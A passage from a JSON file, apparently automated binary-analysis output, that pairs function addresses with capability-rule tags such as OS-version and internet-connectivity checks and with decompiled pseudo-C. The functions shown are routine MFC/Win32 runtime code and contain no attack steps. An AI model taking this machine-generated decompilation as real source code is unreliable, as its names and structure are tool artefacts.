(*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                iVar4 = iVar4 + iVar3;\n            }\n        }\n        else {\ncode_r0x00430768:\n            if ((*(*puVar5 + 0x44ace1) & 4) != 0) {\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = puVar5 + 1;\ncode_r0x00430777:\n            iVar4 = iVar4 + 1;\n        }\n        uVar1 = *puVar5;\n    }\n    puVar5 = fcn.00401460(iVar4);\n    do {\n        while( true ) {\n            if (*arg_ch == 0) {\n                fcn.00411955(puVar5 - *arg_8h);\n                return;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 == 0x25) break;\ncode_r0x004307e2:\n            if ((*(uVar1 + 0x44ace1) & 4) != 0) {\n                *puVar5 = uVar1;\n                puVar5 = puVar5 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *puVar5 = *arg_ch;\n            puVar5 = puVar5 + 1;\n            arg_ch = arg_ch + 1;\n        }\n        uVar2 = arg_ch[1];\n        if ((uVar2 < '1') || ('9' < uVar2)) {\n            if ((uVar2 < 'A') || ('Z' < uVar2)) goto code_r0x004307e2;\n            if (uVar2 < ':') goto code_r0x004307b2;\n            iVar4 = uVar2 + -0x38;\n        }\n        else {\ncode_r0x004307b2:\n            iVar4 = uVar2 + -0x31;\n        }\n        arg_ch = arg_ch + 2;\n        if (iVar4 < arg_14h) {\n            iVar4 = *(arg_10h + iVar4 * 4);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, iVar4);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar5);\n                puVar5 = puVar5 + iVar4;\n            }\n        }\n        else {\n            *puVar5 = 0x3f;\n            puVar5 = puVar5 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 885
    },
    "004309e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004309e4(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x44933c;\n    uVar3 = *0x449338;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0042f02c(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 354
    },
    "00430a72": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430a72(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x44933c;\n    uVar3 = *0x449338;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0042efc3(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 354
    },
    "00430cac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00430cac(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_28h;\n    int32_t lpType;\n    uint lpcbData;\n    uint32_t hKey;\n    uint32_t lParam;\n    uint lpData;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    var_4h = *0x444220;\n    lParam = 0;\n    iVar5 = 0;\n    lpcbData = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetUserDefaultUILanguage\");\n    if (pcVar2 == NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar6 < 0) {\n            hKey = 0;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                              (0x80000001, \"Control Panel\\\\Desktop\\\\ResourceLocale\", 0, 0x20019, &hKey);\n            if (iVar6 == 0) {\n                lpcbData = 0x10;\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0, 0, &lpType, &lpData, &lpcbData);\n                if (((iVar6 == 0) && (lpType == 1)) &&\n                   (iVar6 = fcn.0041ca30(&lpData, 0x43834c, &var_28h), \n                   pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar6 == 1)) {\n                    lParam = var_28h;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(var_28h & 0xffff);\n                    var_38h = (*pcVar1)(var_28h & 0x3ff);\n                    iVar5 = 2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n        else {\n            iVar6 = (*pcVar1)(\"ntdll.dll\");\n            if (iVar6 != 0) {\n                lParam = 0;\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)(iVar6, 0x10, 1, 0x430c96, &lParam);\n                pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n                if (lParam != 0) {\n                    uVar4 = lParam & 0x3ff;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n                    var_38h = (*pcVar1)(uVar4);\n                    iVar5 = 2;\n                }\n            }\n        }\n    }\n    else {\n        lParam = (*pcVar2)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        hKey = lParam & 0x3ff;\n        var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n        var_38h = (*pcVar1)(hKey);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetSystemDefaultUILanguage\");\n        lParam = (*pcVar2)();\n        uVar4 = lParam & 0x3ff;\n        var_34h = (*pcVar1)(lParam & 0xffff);\n        var_30h = (*pcVar1)(uVar4);\n        iVar5 = 4;\n    }\n    (&var_3ch)[iVar5] = 0x800;\n    iVar6 = 0;\n    if (iVar5 != -1) {\n        do {\n            iVar3 = fcn.00430c17(arg_8h, (&var_3ch)[iVar6]);\n            if (iVar3 != 0) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar5 + 1);\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 996
    },
    "0043113e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043113e(int32_t param_1)\n\n{\n    if (*(param_1 + 0x84) != NULL) {\n        (**(**(param_1 + 0x84) + 0x14))();\n    }\n    if (*(param_1 + 0x90) != 0) {\n        fcn.004302ba(\"Settings\", \"PreviewPages\", *(param_1 + 0x90));\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0043187a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043187a(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x138))();\n    }\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.00427add();\n            fcn.00428fdc(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "0043213c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043213c(code **param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    param_1[5] = 0xc0000001;\n    fcn.00412f10();\n    iVar2 = fcn.00431a51();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.00431a51();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.00430967(1);\n        iVar2 = fcn.00431a51();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x1c) == 0)) {\n            iVar2 = fcn.00431a51();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.00434b05(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0042cf43();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x004309b4. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x1c) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0043248d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0043248d(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00432494. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00432665": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432665(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004328ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004328ab(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.0043269d(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 360
    },
    "00432a31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00432a31(int32_t param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint unaff_retaddr;\n    \n    puVar3 = *0x44937c;\n    if (*0x44937c != NULL) {\n        puVar1 = *0x44937c + 7;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        if (param_1 == 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar3);\n            if (iVar4 != 0) {\n                fcn.004328ab(iVar4, unaff_retaddr);\n            }\n        }\n        else {\n            iVar4 = puVar3[5];\n            while (iVar4 != 0) {\n                iVar2 = *(iVar4 + 4);\n                fcn.004328ab(iVar4, param_2);\n                iVar4 = iVar2;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "00432999": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00432999(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    if (*extraout_ECX == 0) {\n        if (*0x44937c == 0) {\n            *(unaff_EBP + -0x10) = 0x449380;\n            *(unaff_EBP + -4) = 0;\n            *0x44937c = fcn.004326e4();\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        iVar1 = fcn.0043249d();\n        *extraout_ECX = iVar1;\n    }\n    iVar1 = fcn.004325a9(*extraout_ECX);\n    if (iVar1 == 0) {\n        iVar1 = (**(unaff_EBP + 8))();\n        fcn.00432789(*extraout_ECX, iVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 325
    },
    "00432b9f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00432b9f(void)\n\n{\n    if (*0x4495b0 == 0) {\n        *0x4495b0 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4493fc);\n    }\n    return *0x4495b0;\n}\n",
        "token_count": 73
    },
    "00432c08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00432c08(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x4495b0 == 0) {\n        fcn.00432b9f();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x4493b8;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4493fc);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x449418);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4493fc);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x449418);\n    return;\n}\n",
        "token_count": 225
    },
    "00432d50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00432d50(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(param_1);\n    if (param_1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_1, uVar1, param_2);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 149
    },
    "00432d7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432d7f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar auStack784 [256];\n    uchar auStack528 [260];\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x444220;\n    iVar1 = fcn.00431a51();\n    *(iVar1 + 8) = *(param_1 + 0x40);\n    *(iVar1 + 0xc) = *(param_1 + 0x40);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x40), auStack528, 0x104);\n    if ((iVar2 == 0) || (iVar2 == 0x104)) {\n        fcn.0042ed6d();\n    }\n    puVar3 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)(auStack528);\n    if (puVar3 == NULL) {\n        fcn.0042ed6d();\n    }\n    *puVar3 = 0;\n    iVar2 = fcn.00432d50(auStack528, auStack268, 0x104);\n    if (iVar2 != 0) {\n        fcn.0042ed6d();\n    }\n    if (*(param_1 + 0x5c) == 0) {\n        uVar4 = fcn.0041cc2b(auStack268);\n        *(param_1 + 0x5c) = uVar4;\n    }\n    if (*(param_1 + 0x4c) == 0) {\n        iVar2 = fcn.004281df(0xe000, auStack784, 0x100);\n        if (iVar2 == 0) {\n            puVar5 = *(param_1 + 0x5c);\n        }\n        else {\n            puVar5 = auStack784;\n        }\n        uVar4 = fcn.0041cc2b(puVar5);\n        *(param_1 + 0x4c) = uVar4;\n    }\n    *(iVar1 + 0x10) = *(param_1 + 0x4c);\n    if (*(param_1 + 0x60) == 0) {\n        if (*(param_1 + 0x68) == 1) {\n            pcVar6 = \".CHM\";\n        }\n        else {\n            pcVar6 = \".HLP\";\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar3, pcVar6);\n        uVar4 = fcn.0041cc2b(auStack528);\n        *(param_1 + 0x60) = uVar4;\n        *puVar3 = 0;\n    }\n    if (*(param_1 + 100) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack268, \".INI\");\n        uVar4 = fcn.0041cc2b(auStack268);\n        *(param_1 + 100) = uVar4;\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 730
    },
    "00432ecd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00432ecd(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.00431a51();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.00431a51();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x44) = param_1;\n        *(iVar3 + 0x48) = param_2;\n        *(iVar3 + 0x40) = unaff_ESI;\n        fcn.00432d7f();\n    }\n    iVar3 = fcn.00431a51();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.004289d0();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x44909c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 337
    },
    "00432fdc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00432fdc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00433945();\n    fcn.00434b91();\n    fcn.0041aec1();\n    if (param_1 == 0) {\n        iVar1 = fcn.0042852f();\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x3c) != NULL) {\n                (**(**(iVar1 + 0x3c) + 4))(1);\n            }\n            *(iVar1 + 0x3c) = 0;\n        }\n        iVar1 = fcn.00431a41();\n        if (*(iVar1 + 0x100) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar1 + 0x100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "004332a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004332a4(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(param_1 + 1);\n    if (iVar1 == 0) {\n        (**(*param_1 + 0x10))();\n    }\n    return iVar1;\n}\n",
        "token_count": 106
    },
    "004332e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004332e2(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x43c0fc == *param_2) && (param_2[1] == *0x43c100)) && (param_2[2] == *0x43c104)) &&\n           (param_2[3] == *0x43c108)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 455
    },
    "00433390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00433390(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 292
    },
    "004333f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004333f0(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 86
    },
    "004334b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004334b4(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x70) = param_2;\n    if (param_2 != 1) {\n        param_2 = ((param_2 != 2) - 1 & 3) - 1;\n    }\n    return param_2;\n}\n",
        "token_count": 89
    },
    "0043354d": {
        "rules": [
